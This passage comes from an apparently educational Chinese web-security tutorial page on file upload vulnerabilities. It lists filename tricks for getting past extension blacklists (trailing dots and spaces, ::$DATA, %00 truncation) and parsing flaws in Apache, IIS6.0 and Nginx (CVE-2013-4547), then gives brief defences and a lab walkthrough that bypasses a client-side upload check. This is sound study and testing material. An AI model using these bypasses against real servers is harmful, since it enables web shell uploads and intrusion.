<tr>
<th>上传文件名</th>
<th>服务器文件名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>file.php[空格]</td>
<td>file.php</td>
<td></td>
</tr>
<tr>
<td>file.php[.]</td>
<td>file.php</td>
<td>任意数量.均可</td>
</tr>
<tr>
<td>file.php[%80-%99]</td>
<td>file.php</td>
<td>BurpSuite抓包，在文件名结尾输%80，<br>CTRL+SHIFT+U进行URL-DECODE，<br>或者增加一个空格，再在在HEX视图为把20修改为80</td>
</tr>
<tr>
<td>file.php::$DATA</td>
<td>file.php</td>
<td>文件内容不变</td>
</tr>
<tr>
<td>file.php::$DATA......</td>
<td>file.php</td>
<td>文件内容不变</td>
</tr>
</tbody>
</table>
<h4 id="-_2">服务端文件扩展名验证-黑名单绕过</h4>
<p><strong>%00截断</strong> php &lt; 5.3.34 可用</p>
<p>%00 是 chr(0)，它不是空格，是NULL，空字符。</p>
<p>当程序在输出含有 chr(0) 变量时，chr(0) 后面的数据会被停止，换句话说，就是误把它当做结束符，后面的数据直接忽略，这就导致漏洞产生的原因。</p>
<p>在文件上传中，利用 %00 截断，在文件扩展名验证时，是取文件的扩展名来做验证，但是最
后文件保存在本地时，%00 会截断文件名，只保存 %00 之前的内容。</p>
<h3 id="_12">中间件文件解析漏洞</h3>
<h4 id="apache">Apache 解析漏洞</h4>
<p>Apache 解析文件规则时从右到左. 例如 shell.php.gix.ccc, apache 会先识别 ccc, ccc 不被识别, 则识别 gix, 以此类推, 最后会被识别为 php 执行.</p>
<p>https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</p>
<h4 id="iis60">IIS6.0 解析漏洞</h4>
<p><strong>目录解析</strong></p>
<p>目录名为 <code>.asp</code>、<code>.asa</code>、<code>.cer</code>，则目录下的所有文件都会被作为ASP解析。</p>
<p><code>url/test.asp/shelljpg</code> 会被当作asp脚本运行。</p>
<p><strong>文件解析</strong></p>
<p>文件名中分号后不被解析，例如<code>.asp;</code>、<code>.asa;</code>、<code>.cer;</code>。</p>
<p><code>url/test.asp;shell.jpg</code> 会被当作asp脚本运行。</p>
<p><strong>文件类型解析</strong></p>
<p><code>.asa</code>，<code>.cer</code>，<code>.cdx</code> 都会被作为 asp 文件执行。
<code>url/shell.asa</code> 会被作为asp文件执行。</p>
<h4 id="nginx">Nginx 解析漏洞</h4>
<p>PHP+Nginx 默认是以cgi的方式去运行，当用户配置不当，会导致任意文件被当作php去解析。</p>
<p>利用条件</p>
<ul>
<li>以 FastCGl 运行</li>
<li><code>cgi.fix_pathinfo = 1</code> (全版本PHP默认为开启)</li>
</ul>
<p>满足以上条件时, 访问 url/shell.jpg/shellphp 时，shell.jpg 会被当作 php 去执行。</p>
<h4 id="nginx-cve-2013-4547">Nginx 文件名逻辑漏洞（CVE-2013-4547）</h4>
<p><strong>影响版本</strong>: Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
<p><strong>利用过程</strong>:</p>
<ol>
<li>上传一个 <code>shell.jpg</code> 文件，注意最后为空格</li>
<li>访问 <code>url/shell.jpg[0x20][0x00].php</code> （两个中括号中的数字是用Burp在Hex界面中更改)</li>
</ol>
<h2 id="_13">文件上传漏洞防御</h2>
<ul>
<li>服务端文件扩展名使用白名单检测+文件名重命名</li>
<li>对文件内容进行检测</li>
<li>对中间件做安全的配置</li>
</ul>
<h2 id="_14">文件上传漏洞练习</h2>
<h3 id="pass-01">Pass-01</h3>
<p><img alt="image-20210916140133931" src="https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/file_upload/image-20210916140133931.png" /></p>
<p>经过测试发现文件上传限制为客户端限制, 可以本地删除对 checkFile 函数的调用实现绕过</p>
<p><img alt="image-20210916140023241" src="https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/file_upload/image-20210916140023241.png" /></p>
<p>将文件后缀改为 jpg 上传, 通过 Burpsuite 抓包修改文件名也可以实现绕过</p>
<p><img alt="image-20210916141131397" src="https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/file_upload/image-20210916141131397.png" /></p>

              
            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="页脚">
      
        
        <a href="../file_include/" class="md-footer__link md-footer__link--prev" aria-label="上一页: 文件包含漏洞" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                上一页
              </span>
              文件包含漏洞
            </div>
          </div>
        </a>
      
      
        
        <a href="../java_deserialization/" class="md-footer__link md-footer__link--next" aria-label="下一页: Java deserialization" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                下一页
              </span>
              Java deserialization
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.0bbba5b5.min.js"}</script>
    
    
      <script src="../../assets/javascripts/bundle.e1a181d9.min.js"></script>
      
    
  </body>
</html>